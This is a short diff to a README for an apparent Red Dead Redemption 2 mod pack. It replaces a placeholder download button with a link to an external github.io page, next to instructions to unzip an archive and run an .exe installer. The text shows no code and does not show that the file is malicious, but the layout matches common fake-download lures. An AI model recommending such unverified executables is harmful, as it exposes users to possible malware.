@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file – the mods will be automatically installed into your RDR2 mods folder.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://immersive-modpack-rdr2.github.io/.github/)
 
 ## 📸 Overview
 ![rdr2-immersive-modpack-visuals](https://github.com/user-attachments/assets/3737dbbe-11a6-47d4-88f8-87af455fc4ae)
